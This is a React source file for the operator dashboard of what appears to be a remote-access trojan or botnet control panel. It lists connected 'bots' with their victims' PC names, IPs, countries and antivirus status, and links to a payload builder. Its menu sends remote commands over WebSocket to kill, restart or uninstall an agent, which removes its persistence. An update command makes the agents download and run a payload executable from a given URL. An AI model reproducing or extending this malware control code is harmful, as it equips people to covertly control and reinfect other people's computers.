import React, { useEffect, useState, useRef } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { Terminal, Monitor, MoreVertical, Wifi, Video, Folder, Activity, Trash2, Power, RefreshCw, DownloadCloud, LogIn, Shield, Clock } from 'lucide-react';
import { API_BASE_URL, WS_BASE_URL } from '../config';

export default function Dashboard() {
  const [agents, setAgents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [openMenuId, setOpenMenuId] = useState(null);
  const menuRef = useRef(null);
  const navigate = useNavigate();

  const sendCommand = (agentId, command) => {
      const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
      ws.onopen = () => {
          ws.send(command);
          ws.close();
      };
      setOpenMenuId(null);
  };

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (menuRef.current && !menuRef.current.contains(event.target)) {
        setOpenMenuId(null);
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  useEffect(() => {
    const fetchAgents = async () => {
      try {
        const res = await fetch(`${API_BASE_URL}/api/agents`);
        const data = await res.json();
        setAgents(data);
      } catch (e) {
        console.error("Fetch error", e);
      } finally {
        setLoading(false);
      }
    };

    fetchAgents();
    const interval = setInterval(fetchAgents, 2000);
    return () => clearInterval(interval);
  }, []);

  const handleAction = (agentId, action) => {
      if (action === 'connect') navigate(`/client/${agentId}`);
      
      // Lifecycle Actions
      if (action === 'kill') sendCommand(agentId, '__KILL__');
      if (action === 'restart') sendCommand(agentId, '__RESTART__');
      if (action === 'uninstall') {
          if (confirm("Are you sure you want to uninstall this agent? It will remove persistence and delete itself.")) {
              sendCommand(agentId, '__UNINSTALL__');
          }
      }
      if (action === 'update') {
          const url = prompt("Enter payload URL to update:", `${API_BASE_URL}/download/payload.exe`);
          if (url) sendCommand(agentId, `__UPDATE__:${url}`);
      }
      if (action === 'delete') {
          if (confirm("Remove this agent from the panel list? Logs will be kept.")) {
              fetch(`${API_BASE_URL}/api/agents/${agentId}`, { method: 'DELETE' })
                  .then(() => setAgents(prev => prev.filter(a => a.id !== agentId)))
                  .catch(err => console.error(err));
          }
      }
      
      setOpenMenuId(null);
  };

  return (
    <div className="max-w-7xl mx-auto">
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
        <div className="bg-[#1a1a1a] border border-[#333] p-4 rounded-sm flex flex-col relative overflow-hidden group">
          <div className="text-gray-500 text-xs uppercase tracking-widest mb-1">Total Agents</div>
          <div className="text-2xl text-white font-mono">{agents.length}</div>
          <div className="absolute right-2 top-2 text-[#333] group-hover:text-cyan-900/40 transition-colors">
            <Wifi size={32} />
          </div>
        </div>
        <div className="bg-[#1a1a1a] border border-[#333] p-4 rounded-sm flex flex-col">
          <div className="text-gray-500 text-xs uppercase tracking-widest mb-1">Online Now</div>
          <div className="text-2xl text-green-500 font-mono">
              {agents.filter(a => a.status === 'Online').length}
          </div>
        </div>
      </div>

      <div className="bg-[#1a1a1a] border border-[#333] rounded-sm overflow-hidden min-h-[500px]">
        <div className="bg-[#222] px-4 py-3 border-b border-[#333] flex justify-between items-center">
          <h3 className="text-sm font-semibold text-gray-300 uppercase tracking-wider flex items-center gap-2">
            <Monitor size={16} className="text-cyan-400" />
            Connected Bots
          </h3>
          <div className="text-xs text-gray-500 font-mono">PORT: 9000</div>
        </div>

        {loading ? (
           <div className="p-10 text-center text-gray-600 font-mono text-sm">LOADING NETWORK...</div>
        ) : agents.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-[400px] text-gray-600">
             <div className="mb-4 opacity-20">
                <Monitor size={64} />
             </div>
             <p className="text-sm font-mono">NO CLIENTS CONNECTED</p>
             <Link to="/builder" className="mt-4 px-4 py-2 border border-[#333] hover:border-cyan-400/50 text-xs text-cyan-400 hover:bg-cyan-900/10 transition">
                + GENERATE PAYLOAD
             </Link>
          </div>
        ) : (
          <table className="w-full text-left text-sm">
            <thead className="bg-[#1f1f1f] text-gray-500 font-medium">
              <tr>
                <th className="p-3 pl-4 w-10">
                    <input type="checkbox" className="bg-[#111] border-[#444] rounded-sm" />
                </th>
                <th className="p-3">PC NAME / USER</th>
                <th className="p-3">IP ADDRESS</th>
                <th className="p-3">SECURITY</th>
                <th className="p-3">STATS</th>
                <th className="p-3">STATUS</th>
                <th className="p-3 text-right">ACTIONS</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-[#2a2a2a]">
              {agents.map((agent) => {
                  const isOnline = agent.status === 'Online';
                  return (
                <tr key={agent.id} className={`group transition-colors relative ${isOnline ? 'hover:bg-[#252525]' : 'opacity-50 grayscale bg-[#151515]'}`}>
                  <td className="p-3 pl-4">
                     <input type="checkbox" disabled={!isOnline} className="bg-[#111] border-[#444] rounded-sm" />
                  </td>
                  <td className="p-3 text-white">
                      <div className="font-bold">{agent.specs?.pc_name || "Guest-PC"}</div>
                      <div className="text-[10px] text-gray-500 font-mono">{agent.id}</div>
                  </td>
                  <td className="p-3 font-mono text-gray-300">
                      {agent.ip || "Unknown"}
                      <div className="text-xs text-gray-500">{agent.specs?.country}</div>
                  </td>
                  <td className="p-3 text-gray-400">
                      <div className="flex items-center gap-2" title={agent.specs?.antivirus}>
                          <Shield size={14} className={agent.specs?.antivirus !== 'None' ? 'text-red-400' : 'text-green-500'} />
                          <span className="truncate max-w-[100px]">{agent.specs?.antivirus || "None"}</span>
                      </div>
                  </td>
                  <td className="p-3 text-gray-400 text-xs font-mono">
                      <div className="flex items-center gap-2">
                          <Activity size={12} className="text-cyan-500" />
                          <span>Ping: {agent.stats?.ping || 0}ms</span>
                      </div>
                      <div className="flex items-center gap-2 mt-1 opacity-70">
                          <Clock size={12} />
                          <span>UP: {agent.specs?.uptime || "0m"}</span>
                      </div>
                  </td>
                  <td className="p-3">
                    {isOnline ? (
                        <span className="text-green-500 text-xs font-mono uppercase border border-green-900/50 bg-green-900/10 px-2 py-0.5 rounded animate-pulse">
                            Online
                        </span>
                    ) : (
                        <span className="text-gray-500 text-xs font-mono uppercase border border-gray-700/50 bg-gray-800/50 px-2 py-0.5 rounded">
                            Offline
                        </span>
                    )}
                  </td>
                  <td className="p-3 text-right relative">
                    <div className="flex items-center justify-end gap-2">
                        {/* Connect Button */}
                        <button 
                            disabled={!isOnline}
                            onClick={() => handleAction(agent.id, 'connect')}
                            className={`flex items-center gap-2 px-3 py-1.5 rounded-sm text-xs font-bold transition shadow-lg ${isOnline ? 'bg-indigo-600 hover:bg-indigo-500 text-white shadow-indigo-900/20' : 'bg-[#333] text-gray-500 cursor-not-allowed'}`}
                        >
                            <LogIn size={14} /> CONNECT
                        </button>

                        {/* More Button */}
                        <button 
                            onClick={(e) => { e.stopPropagation(); setOpenMenuId(openMenuId === agent.id ? null : agent.id); }}
                            className={`inline-flex items-center justify-center w-8 h-8 rounded transition ${openMenuId === agent.id ? 'bg-[#333] text-white' : 'hover:bg-[#333] text-gray-400 hover:text-white'}`}
                        >
                            <MoreVertical size={16} />
                        </button>
                    </div>

                    {/* Dropdown Menu (Lifecycle Only) */}
                    {openMenuId === agent.id && (
                        <div ref={menuRef} className="absolute right-8 top-10 w-48 bg-[#1a1a1a] border border-[#333] shadow-2xl rounded-sm z-50 overflow-hidden animate-fade-in-fast">
                            <div className="text-[10px] text-gray-500 font-bold px-3 py-2 bg-[#111] border-b border-[#333] tracking-wider">LIFECYCLE MANAGEMENT</div>
                            
                            <button onClick={() => handleAction(agent.id, 'update')} className="w-full text-left px-4 py-2.5 text-blue-400 hover:bg-blue-900/10 flex items-center gap-3 transition border-b border-[#222]">
                                <DownloadCloud size={14} /> Update Agent
                            </button>
                            <button onClick={() => handleAction(agent.id, 'restart')} className="w-full text-left px-4 py-2.5 text-orange-400 hover:bg-orange-900/10 flex items-center gap-3 transition border-b border-[#222]">
                                <RefreshCw size={14} /> Restart Process
                            </button>
                            <button onClick={() => handleAction(agent.id, 'kill')} className="w-full text-left px-4 py-2.5 text-red-400 hover:bg-red-900/10 flex items-center gap-3 transition border-b border-[#222]">
                                <Power size={14} /> Kill Process
                            </button>
                            <button onClick={() => handleAction(agent.id, 'uninstall')} className="w-full text-left px-4 py-2.5 text-red-500 hover:bg-red-900/20 flex items-center gap-3 transition font-bold bg-red-900/5">
                                <Trash2 size={14} /> Uninstall (Delete)
                            </button>
                            {!isOnline && (
                                <button onClick={() => handleAction(agent.id, 'delete')} className="w-full text-left px-4 py-2.5 text-gray-400 hover:bg-gray-800 flex items-center gap-3 transition border-t border-[#222]">
                                    <Trash2 size={14} /> Remove from List
                                </button>
                            )}
                        </div>
                    )}
                  </td>
                </tr>
              );
              })}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
}